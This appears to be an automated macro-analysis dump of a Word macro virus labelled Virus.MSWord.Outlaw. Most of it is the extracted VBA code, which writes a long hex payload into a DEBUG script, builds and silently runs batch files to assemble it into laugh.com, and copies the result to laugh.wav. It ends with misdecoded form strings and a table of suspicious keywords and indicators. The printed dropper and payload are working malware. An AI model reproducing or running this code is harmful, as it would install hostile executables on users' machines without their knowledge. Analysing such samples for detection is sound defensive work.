Print #1, "E 05F0 F0 57 2E 3C B6 DC 8E 0D 1E 2D 61 53 C2 34 31 C1"
Print #1, "E 0600 4A 19 4E FA 42 6B D7 7A 62 2F 8F 9A 92 E6 5F BE"
Print #1, "E 0610 71 05 4E FF 38 C4 4E DD D9 1D 21 63 5A 51 12 E5"
Print #1, "E 0620 3C 29 5B 17 CB EF 5D DF DF 2C 4E 42 7A 71 BE FC"
Print #1, "E 0630 EB 1A CE 38 FC D6 FE CD E4 22 23 D3 5A 95 FA 98"
Print #1, "E 0640 92 66 FD BE E0 93 22 50 A8 46 BE FE 48 F0 CF 22"
Print #1, "E 0650 3E CB 2F AC 5A EA 0F EC 43 E3 DB D2 B9 54 AB 64"
Print #1, "E 0660 D2 7E FD B7 E8 8D 72 89 0E 18 1E EA 43 B0 3E 55"
Print #1, "E 0670 01 D3 EE FD 19 2A EE AF 52 93 E3 D2 CA 94 0B 85"
Print #1, "E 0680 0E 3A 7F CB 5F BD F7 D5 D7 45 AF 72 9D 46 7F E1"
Print #1, "E 0690 CC 38 7F F5 4D E5 0F C0 25 F1 E3 DA C1 94 C7 21"
Print #1, "E 06A0 F2 15 D7 DF DF AF 5D 5F 55 15 DF C5 CC FA 9F 0D"
Print #1, "E 06B0 9C 23 BF 86 BE 25 9F 72 EB FC A5 52 42 95 29 64"
Print #1, "E 06C0 4A 16 5F 7F FD D5 DF FD 7F 17 6F BF D5 53 BF 91"
Print #1, "E 06D0 41 12 5F 6E 8A 98 FF F7 92 EF E3 DA 42 79 48 DF"
Print #1, "E 06E0 4B 16 D7 77 F7 15 7F 5F D7 5F 7F 2B A0 F6 3F DA"
Print #1, "E 06F0 D3 57 EF B8 80 B9 0F AE 64 A9 DD C2 41 51 C9 23"
Print #1, "E 0700 21 1B F7 5F 5F 27 77 D7 F7 25 4F E7 60 9A 8F D5"
Print #1, "E 0710 A5 A2 5F 50 A1 D7 8F 09 C4 ED 4F 3A 2A 75 C0 8B"
Print #1, "E 0720 04 25 D9 77 DD 55 CF 8E 6F 25 7F 55 5E 53 2F A6"
Print #1, "E 0730 76 13 4F DE ED E1 AF 21 7C 1C D9 52 2A 71 29 D4"
Print #1, "E 0740 E9 2F 92 0D 57 1F B5 09 98 4F 0F 1A 5B 4C 7E 10"
Print #1, "E 0750 DC AA DF 24 28 EF 5F CB ED 94 9F DA 42 99 C9 27"
Print #1, "E 0760 31 28 DF 7F FD F6 5F 4A A0 6F 0E 89 C1 BD 9E 10"
Print #1, "E 0770 3A 07 9E FD 12 F8 0E A0 A9 49 25 63 B2 51 17 41"
Print #1, "E 0780 52 4C 1C EF FF EF 0A 4B 7D 45 FE B7 5B 46 2E 25"
Print #1, "E 0790 22 4B 7F DB 03 1A EE 68 5C 60 E1 4A D2 54 C4 ED"
Print #1, "E 07A0 26 76 03 AE 42 6F 66 77 29 79 2F 94 C1 CD AF 04"
Print #1, "E 07B0 99 B4 7E 71 0C 1A BF 5D DE FD E1 D2 CA 75 77 8F"
Print #1, "E 07C0 8A 24 5F 7D DD 6F 7D 5D DF 25 4F FC 5C DA 3F 92"
Print #1, "E 07D0 55 F7 BF 08 8E 89 7F 05 BE 0C 63 63 3A 75 DE D6"
Print #1, "E 07E0 2F 25 75 DD F7 2F FF 7F F7 25 3F 06 06 64 8F 33"
Print #1, "E 07F0 FA BF 6F 5E 14 6D CF A3 0E 27 A3 D3 32 95 AF 5A"
Print #1, "E 0800 EB 25 DD D5 7D 57 FF DF FD 2D 7F 53 86 CB 9F 6C"
Print #1, "E 0810 65 DD AF 32 7E 13 DF 68 6D 0E 23 D3 CA 74 09 5D"
Print #1, "E 0820 2B 27 55 D5 F7 6D F7 77 F7 27 6F A4 D9 04 CF 4A"
Print #1, "E 0830 F5 81 8F 52 CE 81 CF 6A C2 04 1B 63 2A 31 4A F8"
Print #1, "E 0840 8A 24 57 F5 75 FF 55 FF F5 1F DF 6A 70 23 BF 3E"
Print #1, "E 0850 B8 80 5F EF 40 A2 CF 6F 98 39 53 32 39 71 49 AD"
Print #1, "E 0860 5D 2E 57 57 49 1F 80 CB F5 37 7F DE 49 56 6F AE"
Print #1, "E 0870 3A 02 CF 7A E3 30 DE CC B4 99 61 E3 C9 74 17 D2"
Print #1, "E 0880 5F 72 F3 5D EF 95 5F B7 8A 6F FF A3 20 03 5E 52"
Print #1, "E 0890 D2 94 2E A4 95 22 4F 1D 4C 92 DF 5A C3 70 4A D8"
Print #1, "E 08A0 22 56 CA ED 6A 45 47 F7 87 2B 3E 67 A9 0D EE 9E"
Print #1, "E 08B0 D4 79 FE 52 00 66 7E 6B 76 AE E3 5B 3A 95 76 20"
Print #1, "E 08C0 FF 5E AA 3C 26 B2 3D 5F 3F 7B BF 6D DE 8E EE 84"
Print #1, "E 08D0 84 D3 DE 44 B4 0D BE 5A E4 F5 5D 53 B2 70 76 12"
Print #1, "E 08E0 31 29 FD 20 63 FD AD 57 AF 44 4E 26 FD AB 5E 65"
Print #1, "E 08F0 18 85 2E C9 B2 1F DE 00 FA 29 5D E3 B2 95 8E 53"
Print #1, "E 0900 64 24 F9 C7 F7 6F 7F 77 5F 15 9E E5 CA 19 AD 4E"
Print #1, "E 0910 7E DA 8F 82 96 F5 7F 06 76 08 A3 62 CC B8 EF 93"
Print #1, "E 0920 B0 18 57 77 FD FD 7F D5 FD 0F 7F 5D C6 7C 3F 88"
Print #1, "E 0930 4C 8A CF 3E 70 0F 9F 90 C4 1C E3 DA 54 99 23 57"
Print #1, "E 0940 6C 3F 7D DD 5F 07 57 DD 7F 1F 9F DC 64 94 5F 88"
Print #1, "E 0950 AB 9E CF 45 DC 11 7F A2 A3 5E 25 DB 42 D9 A1 1A"
Print #1, "E 0960 64 18 F5 F7 77 6D DF FD DF 17 4F 67 6C 3D 8F 21"
Print #1, "E 0970 9B 11 0F 50 B6 AC 4F 79 7E 5C E7 5A BB B9 3D A1"
Print #1, "E 0980 EE 14 FF 57 FD B5 FF 77 5F 5F 6F 4E 02 61 DF 72"
Print #1, "E 0990 36 C3 1F 8E 08 BF 7F B7 BA 15 A5 5B C2 94 5B B3"
Print #1, "E 09A0 F0 65 F7 DD FD A5 75 DF FD 1D 7F 61 DA 55 EF 29"
Print #1, "E 09B0 B4 70 2F 2F CB 62 9F ED 5D F8 21 6B CA 71 8C 0B"
Print #1, "E 09C0 6C 53 FD D5 57 75 D7 DF DF 7D 4F 1A 8B F0 0F AD"
Print #1, "E 09D0 31 CF 7F DA 68 99 FF 86 0C BB 21 D3 A1 70 C1 18"
Print #1, "E 09E0 71 75 FF 75 E6 B1 5B 9F 71 75 8F BF A4 D2 BF 46"
Print #1, "E 09F0 F9 32 3F 54 98 1B 7F 6B 26 09 A1 62 54 95 92 D5"
Print #1, "E 0A00 73 55 DD BF 80 CB AE 9F 2B 2F 7F E5 95 F2 0F 9A"
Print #1, "E 0A10 BD BD DF 7F 83 F6 7F 64 D6 11 21 E3 BA 98 31 18"
Print #1, "E 0A20 26 76 FC D7 CF 1D AB 89 F6 1F CE 28 FD 13 3E 32"
Print #1, "E 0A30 DB 9E BF CD DD 5B 3E 70 76 AE A3 5A CB 70 F6 23"
Print #1, "E 0A40 11 56 C8 B3 6A C4 FE F5 7F 37 6F C7 32 CB DF 5A"
Print #1, "E 0A50 8B C8 BE 4E 64 A4 4E FA AD F5 61 DB 32 95 9B 5A"
Print #1, "E 0A60 2D 26 5C 7F E6 36 E8 AE A3 28 7E 71 98 9C 9F 7C"
Print #1, "E 0A70 3B 64 BF 7B 8A 03 5E 89 6B 02 DF D2 B1 90 C9 20"
Print #1, "E 0A80 F1 22 54 26 EB BD 82 0B 02 1F BE FB 33 1D DE F1"
Print #1, "E 0A90 3B 85 CE 47 B8 38 1E E1 E9 C3 23 63 43 91 A4 8E"
Print #1, "E 0AA0 1D 56 A8 2D 30 AB 9A 7D 9F 5D 5F 66 60 88 8F 5F"
Print #1, "E 0AB0 F9 7D 6F 53 34 14 2E 72 0D D1 5F 6B B2 94 C9 14"
Print #1, "E 0AC0 B2 55 FF FF 3F 49 7D DD DD 2D 2E 8A CE E2 7F AF"
Print #1, "E 0AD0 96 87 4F 2C 15 9B 0F 65 C2 1E 65 EB 3A B5 70 BD"
Print #1, "E 0AE0 AB 58 77 D7 D7 0D D5 75 FF 2F 0F 0C 99 C7 9F D6"
Print #1, "E 0AF0 E5 D3 6F 76 F2 E5 FF 6A 54 5F A3 5B 3B 99 27 63"
Print #1, "E 0B00 0A 2D 57 FF DD 7F DD D7 FF 55 BF EA 7A 00 3F CA"
Print #1, "E 0B10 09 5A CF F0 25 30 AF AC 1E 42 61 EB 33 99 29 E0"
Print #1, "E 0B20 45 29 F5 F7 F7 3D 77 7F FD 65 DF A4 1E 9C CF A0"
Print #1, "E 0B30 CE 37 2F 0F E4 C7 1F 60 AA 2D E1 EB C2 99 1F 59"
Print #1, "E 0B40 EB 68 F5 DD 77 E7 F5 FF F5 2F BF 58 56 30 7F 9A"
Print #1, "E 0B50 6E 1E 0F 47 98 2F DF 22 28 9B 61 E3 C3 B9 83 5A"
Print #1, "E 0B60 AD 35 57 1F 62 1D 57 7F 5D 35 FF 51 5C 32 8F 87"
Print #1, "E 0B70 FC 76 BF 4F 28 7E 6F 5A C5 09 5F F3 C9 9D 9C 27"
Print #1, "E 0B80 61 73 7F DD FF A7 D8 DD D7 2D 4F DB 9C 06 1F 10"
Print #1, "E 0B90 F0 10 2F 3E 62 0F 2F 08 61 EB 61 6B B2 B9 2E D7"
Print #1, "E 0BA0 20 39 DF F7 75 B6 F5 D7 DD 3F 6F A4 08 DD 1F 69"
Print #1, "E 0BB0 A6 66 6F CF 53 1E DF 8F 04 E5 1D 6B 5B 75 2F 61"
Print #1, "E 0BC0 8D 38 DD 7F 55 9D 7E 9F 8D 34 FF 21 0A B1 AF 07"
Print #1, "E 0BD0 6E 36 0F A2 CA 57 8F A4 01 84 E1 63 33 BD BC 54"
Print #1, "E 0BE0 56 3B 5D FF FF CD 55 F7 CB 3E 9F 1A 00 F5 1F 2D"
Print #1, "E 0BF0 73 0A 1F B0 BE 30 2F F6 BA EC 23 64 33 DD C0 1E"
Print #1, "E 0C00 F0 39 15 7F D5 DC F7 9F FB 37 6F 9D 62 6C 4F A5"
Print #1, "E 0C10 5D 28 BF 03 73 B9 AF 33 F8 98 61 EC 41 99 AA D2"
Print #1, "E 0C20 89 34 B6 75 5F 06 E2 3D 63 4E 1F 4E 23 F9 EF 4B"
Print #1, "E 0C30 6E CB 5F 87 B0 88 4F 26 42 E2 1F E4 B2 BD C9 E2"
Print #1, "E 0C40 9F 33 5D EE C8 E4 BB 7F 05 5D 1F 22 79 F3 1F B0"
Print #1, "E 0C50 D6 DD 8F 0F 4C 8F 2F 8C 66 92 9F 6B B4 BD 7C B1"
Print #1, "E 0C60 C7 46 EE 84 E3 4D FF 91 6A 4A 8F 1E 02 01 2F 1C"
Print #1, "E 0C70 80 DF CF D3 1B 05 9F 86 5A 09 1F 6C 51 DA 2B 7E"
Print #1, "E 0C80 8D 50 5D 55 C4 8F 9F AB 2A 79 9F B6 C2 CE 0E 26"
Print #1, "E 0C90 81 89 9F 9B DE 73 1F 90 EE 9B DF DC 3A BE 42 A1"
Print #1, "E 0CA0 40 48 6A B4 63 8D A7 BF B2 4A 6F 5C 13 A3 EE 52"
Print #1, "E 0CB0 F6 E3 6E B8 C4 C4 7F C7 49 29 5D 6B D3 BD 0C 9D"
Print #1, "E 0CC0 0B 43 3B DD 62 97 FD AC 63 4F 4E 57 10 8E 6F 3B"
Print #1, "E 0CD0 69 4F 6F A8 0C 15 AF 0C C6 EB DF EB D1 B9 3D 2D"
Print #1, "E 0CE0 2C 58 50 15 D9 4C D5 FD FF 61 CF 21 01 31 2F 1D"
Print #1, "E 0CF0 61 A4 BE 10 D8 FA AE 88 E8 BE 1F 64 C2 99 1A 64"
Print #1, "E 0D00 32 45 ED 9F 94 C9 0E 7D F7 4D BE 30 BC 94 2F E8"
Print #1, "E 0D10 5D 82 0E 9C 7A 4D 9E D0 EB E5 1F EC BA BD 40 62"
Print #1, "E 0D20 E0 4D 36 7F 46 D1 8A F0 3F 4B CE A6 4E 1F 7E 25"
Print #1, "E 0D30 E5 53 4F 61 B4 FE AE A0 A0 86 E1 64 61 B9 C8 F1"
Print #1, "E 0D40 06 48 FF 57 1F 02 42 80 B0 5A FE DE 41 E4 EE 86"
Print #1, "E 0D50 D8 B2 2F 84 CE 88 3F 1D E8 E4 1F 64 CA 9A 8B 56"
Print #1, "E 0D60 D1 5C 9A 9F C0 4B 14 7F 3A 55 2E 13 0D BF 3F A9"
Print #1, "E 0D70 8B 73 EE CE 1C F1 9E 87 30 03 A1 D4 CA BD B5 7A"
Print #1, "E 0D80 69 55 3A D8 1F 79 7D D5 FF 5D 9F D7 65 80 AE 44"
Print #1, "E 0D90 CA 6E FE E5 9D CD 0D F9 FC 26 E3 EB 32 B9 02 62"
Print #1, "E 0DA0 03 1D 3B 04 68 AA 02 F7 B9 5F 7F 4A 11 A1 7F 3F"
Print #1, "E 0DB0 5A 92 CF 41 D4 8E AF BD 85 F8 61 E4 41 99 AB A0"
Print #1, "E 0DC0 3D 55 8E 4A 9D CB EB 99 E6 5F AF 32 26 D6 8E F0"
Print #1, "E 0DD0 9A 31 FD 17 9B 1D 6F 03 AD 3A E1 6B 2A 96 88 D8"
Print #1, "E 0DE0 8A 55 89 3F DD 04 82 9F 12 68 4F AF 34 BC 0E FE"
Print #1, "E 0DF0 5B BD DE 4B BB 91 7F 9E 50 CC 5B DC D3 99 2B 5B"
Print #1, "E 0E00 0C 56 6F 97 DF FB 9A D9 00 59 FD F4 18 AD BE 4F"
Print #1, "E 0E10 00 F9 6D F1 A1 B5 6E 49 50 F2 5D 6B C2 99 10 24"
Print #1, "E 0E20 F1 54 FD AE 6F 09 EA 3D 02 69 6D EC C2 B1 6E F3"
Print #1, "E 0E30 E3 8A EE 0A 85 87 3F 05 8C D5 17 6C 53 95 DA E4"
Print #1, "E 0E40 86 33 32 A2 BA BF 21 94 AA 66 2E DF 01 C5 DD 61"
Print #1, "E 0E50 AC 77 9E 78 31 18 1E CC 69 B9 9B 63 4A 99 12 DB"
Print #1, "E 0E60 43 29 C3 7D 9D 8B EA 85 D8 73 9C 17 09 50 3E 02"
Print #1, "E 0E70 C6 D9 3E 43 5B 25 3D 31 10 9B 1D 5C C2 75 9B 77"
Print #1, "E 0E80 8C 48 02 41 F7 BF 0A C5 9D 4B 7E 3F 61 F7 6D 26"
Print #1, "E 0E90 05 92 2D 7E 4A D0 7C 3A 78 A2 1F 64 C2 BD 12 20"
Print #1, "E 0EA0 71 6E 7D 63 89 EA BB 9B 90 3F CD 15 A1 4C 8E 69"
Print #1, "E 0EB0 76 84 3C 15 00 9E 6C 05 80 5D 1F EC C9 BD 27 D8"
Print #1, "E 0EC0 AA 3B 8B 7F A5 66 C3 CE 8A 26 AD 49 AD A8 2C B0"
Print #1, "E 0ED0 33 DB 8C 1F 81 9B EC D7 E9 82 21 EC 31 9A 28 B3"
Print #1, "E 0EE0 37 66 0A 51 E0 9A E3 1F A8 5D 7D 83 28 8E FD EE"
Print #1, "E 0EF0 91 27 2C 8C 6B 13 7D AC F0 C9 9F E4 C1 79 0B A2"
Print #1, "E 0F00 12 05 B5 CA BF 77 28 FF EA 77 CC 46 6A 80 BC 35"
Print #1, "E 0F10 D3 26 EC 69 48 97 FC CC E2 68 DD EB C2 BD E8 60"
Print #1, "E 0F20 6C 7F CA 94 64 7B 83 95 6B 47 1D A6 B5 07 9C 47"
Print #1, "E 0F30 04 20 1B 91 2B 75 0B E8 2B CB"
Print #1, "RCX"
Print #1, "0E3A"
Print #1, "W"
Print #1, "Q"
Close 1

Open G$ + "Sounda.bat" For Output As 1
Print #1, "@echo off"
Print #1, "debug < " + G$ + "laugh.scr > nul"
Close 1

WordBasic.Shell G$ + "Sounda.bat", 0

n = WordBasic.Second(WordBasic.Now())
Timer_ = n + 25
If Timer_ > 59 Then Timer_ = Timer_ - 60
While WordBasic.Second(WordBasic.Now()) <> Timer_
Wend
WordBasic.Beep

Open G$ + "Rename.bat" For Output As 1
Print #1, "@echo off"
Print #1, "copy laugh.com laugh.wav"
Close 1

WordBasic.Shell G$ + "Rename.bat", 0

n = WordBasic.Second(WordBasic.Now())
Timer_ = n + 5
If Timer_ > 59 Then Timer_ = Timer_ - 60
While WordBasic.Second(WordBasic.Now()) <> Timer_
Wend
WordBasic.Beep

Finish:
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�mg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͑�e	�eQ.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�{�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_AQ1��`�P�N�S͑�e	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�P�N0	c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vX[0R 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�e�e�N-N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0x��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0͑�e	�eQ0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�O�_ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N�e�N-N	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnBackup'" IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnClose'" IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnRestore'" IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Outlaw-85266c4e07a48ea2030f26b0135a97ff501e9669' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |btnBackup_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?                   |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?PRD=Word&SBP=ia&PVE|                                             |
|          |R=8.0&AR=templates  |                                             |
|IOC       |redir.dll           |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |laugh.scr           |Executable file name                         |
|IOC       |Sounda.bat          |Executable file name                         |
|IOC       |Rename.bat          |Executable file name                         |
|Hex String|YI1                 |0D594931                                     |
|Base64    |P-5                 |UC01                                         |
|String    |                    |                                             |
|Base64    |P]5                 |UF01                                         |
|String    |                    |                                             |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

